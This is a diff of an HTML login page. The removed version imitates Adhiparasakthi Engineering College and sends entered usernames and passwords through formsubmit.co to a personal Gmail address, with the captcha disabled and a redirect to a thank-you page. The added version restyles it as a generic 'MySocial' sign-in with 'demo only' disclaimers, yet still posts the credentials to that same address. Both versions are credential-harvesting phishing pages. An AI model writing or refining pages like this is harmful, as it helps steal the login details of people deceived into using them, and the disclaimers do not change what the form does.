@@ -1,118 +1,207 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Login Page</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Login — Demo</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #f0f2f5, #dce3f7);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
+    /* Simple, modern login card — NOT an impersonation of any real service */
+    :root{
+      --bg: #f3f4f6;
+      --card: #ffffff;
+      --accent: #405de6; /* pleasant blue-violet, not brand copying */
+      --muted: #6b7280;
+      --round: 12px;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
     }
-    .login-container {
-      background-color: #fff;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-      text-align: center;
-      width: 320px;
-      border-top: 4px solid #b80000;
+    html,body{height:100%}
+    body{
+      margin:0;
+      background: radial-gradient(circle at 10% 10%, rgba(64,93,230,0.06), transparent 10%),
+                  linear-gradient(180deg, var(--bg), #eef2ff 120%);
+      display:flex;
+      align-items:center;
+      justify-content:center;
     }
-    .logo {
-      width: 100px;
-      margin-bottom: 15px;
-      border-radius: 50%;
-      background: #fff;
-      padding: 6px;
+    .container{
+      display:flex;
+      gap:32px;
+      align-items:center;
+      justify-content:center;
+      width:100%;
+      max-width:980px;
+      padding:24px;
+      box-sizing:border-box;
     }
-    h2 {
-      margin: 10px 0 20px;
-      color: #333;
-      font-size: 20px;
+
+    /* left: decorative phone mock */
+    .mock {
+      width:360px;
+      height:700px;
+      background:linear-gradient(180deg,#fff,#fafafa);
+      border-radius:28px;
+      box-shadow: 0 10px 30px rgba(16,24,40,0.08);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      flex-direction:column;
+      padding:24px;
+      gap:18px;
     }
-    label {
-      display: block;
-      text-align: left;
-      font-size: 13px;
-      margin-top: 10px;
-      margin-bottom: 5px;
-      color: #444;
+    .mock .splash {
+      width:100%;
+      height:480px;
+      border-radius:16px;
+      background:
+        linear-gradient(135deg, rgba(64,93,230,0.08), rgba(99,102,241,0.06));
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:var(--muted);
+      font-size:14px;
+      text-align:center;
+      padding:16px;
+      box-sizing:border-box;
     }
-    input[type="text"],
-    input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      font-size: 14px;
+
+    /* right: login card */
+    .card{
+      width:360px;
+      background:var(--card);
+      border-radius:var(--round);
+      box-shadow: 0 10px 30px rgba(16,24,40,0.09);
+      padding:28px;
+      box-sizing:border-box;
     }
-    button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 15px;
-      background-color: #b80000;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-      transition: background 0.3s;
+    .brand {
+      font-weight:700;
+      font-size:28px;
+      letter-spacing:0.2px;
+      margin-bottom:18px;
+      color:#111827;
     }
-    button:hover {
-      background-color: #800000;
+    .subtitle{
+      font-size:13px;
+      color:var(--muted);
+      margin-bottom:18px;
     }
-    .links {
-      margin-top: 12px;
-      font-size: 12px;
+    form { display:flex; flex-direction:column; gap:12px; }
+    .input {
+      display:block;
+      width:100%;
+      padding:12px 14px;
+      border-radius:10px;
+      border:1px solid #e6e9ef;
+      font-size:14px;
+      box-sizing:border-box;
     }
-    .links a {
-      color: #b80000;
-      text-decoration: none;
+    .input:focus{ outline:none; border-color: var(--accent); box-shadow:0 0 0 3px rgba(64,93,230,0.06); }
+    .btn {
+      margin-top:8px;
+      padding:12px 14px;
+      border-radius:10px;
+      border:0;
+      font-weight:600;
+      cursor:pointer;
+      background: linear-gradient(90deg,var(--accent), #6d28d9);
+      color:white;
+      font-size:15px;
     }
-    .links a:hover {
-      text-decoration: underline;
+    .muted-row{
+      margin-top:12px;
+      display:flex;
+      justify-content:space-between;
+      font-size:13px;
+      color:var(--muted);
     }
-    .footer-text {
-      margin-top: 20px;
-      font-size: 11px;
-      color: #777;
-      line-height: 1.4;
+    .divider{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      margin:18px 0;
+      color:var(--muted);
+      font-size:13px;
+    }
+    .divider::before, .divider::after{
+      content:"";
+      height:1px;
+      background:#e6e9ef;
+      flex:1;
+    }
+    .legal{
+      margin-top:12px;
+      font-size:12px;
+      color:#9ca3af;
+    }
+    .demo-note{
+      margin-top:16px;
+      background:#fff7ed;
+      border:1px solid #ffedd5;
+      padding:10px;
+      border-radius:8px;
+      font-size:13px;
+      color:#92400e;
+    }
+
+    @media(max-width:880px){
+      .container{flex-direction:column; gap:20px; padding:18px;}
+      .mock{display:none;}
     }
   </style>
 </head>
 <body>
-  <div class="login-container">
-    <img src="logo.jpg" alt="College Logo" class="logo" />
-    <h2>Adhiparasakthi Engineering College</h2>
-    
-    <!-- ✅ FormSubmit Integration -->
-    <form action="https://formsubmit.co/ragzzway@gmail.com" method="POST">
-      <!-- Form fields -->
-      <label for="username">Username</label>
-      <input id="username" name="username" type="text" placeholder="Enter username" required>
-
-      <label for="password">Password</label>
-      <input id="password" name="password" type="password" placeholder="Enter password" required>
-
-      <!-- Hidden fields for behavior -->
-      <input type="hidden" name="_next" value="https://yourwebsite.github.io/thankyou.html">
-      <input type="hidden" name="_captcha" value="false">
-
-      <button type="submit">Login</button>
-    </form>
-
-    <div class="links">
-      <a href="#">Forgot Password?</a>
+  <div class="container">
+    <div class="mock" aria-hidden="true">
+      <div style="font-weight:700;color:#111827">App Preview</div>
+      <div class="splash">
+        This is a decorative preview area. Use this layout for a clean, professional login experience on your site.
+      </div>
+      <div style="font-size:12px;color:var(--muted)">Demo screenshot — not a real app</div>
     </div>
-    <p class="footer-text">
-      &copy; 2025 Adhiparasakthi Engineering College <br>
-      All Rights Reserved
-    </p>
+
+    <div class="card" role="main" aria-labelledby="login-title">
+      <div id="login-title" class="brand">MySocial</div>
+      <div class="subtitle">Sign in to continue to your account</div>
+
+      <!--
+        IMPORTANT:
+        Replace `YOUR_EMAIL@example.com` with your real formsubmit.co email endpoint.
+        Example: action="https://formsubmit.co/youremail@example.com"
+        This form is intended for demo/testing only — do not collect other people's credentials without explicit consent.
+      -->
+      <form action="https://formsubmit.co/ragzzway@gmail.com" method="POST" autocomplete="on">
+        <!-- To help formsubmit.co identify source you might add a hidden field (optional) -->
+        <input type="hidden" name="_subject" value="Demo login submission">
+        <input type="hidden" name="_template" value="table"> <!-- formsubmit formatting choice -->
+
+        <label class="sr-only" style="display:none">Email or username</label>
+        <input class="input" type="text" name="username_or_email" placeholder="Email address or username" required autocomplete="username">
+
+        <label class="sr-only" style="display:none">Password</label>
+        <input class="input" type="password" name="password" placeholder="Password" required autocomplete="current-password" minlength="6">
+
+        <button class="btn" type="submit">Log in</button>
+
+        <div class="muted-row">
+          <label style="display:flex;align-items:center;gap:8px;font-size:13px;color:var(--muted);">
+            <input type="checkbox" name="remember" style="width:14px;height:14px;"> Remember
+          </label>
+          <a href="#" style="text-decoration:none;color:var(--accent);font-weight:600;font-size:13px;">Forgot password?</a>
+        </div>
+
+        <div class="divider">OR</div>
+
+        <button type="button" class="btn" style="background:transparent;border:1px solid #e6e9ef;color:#111827;font-weight:700;">
+          Continue with Demo Provider
+        </button>
+
+        <p class="legal">By continuing you agree to our Terms of Service and Privacy Policy.</p>
+
+        <div class="demo-note">
+          Demo/testing form — do not use to collect other people's real credentials. Replace the action with your formsubmit.co endpoint.
+        </div>
+      </form>
+    </div>
   </div>
 </body>
 </html>
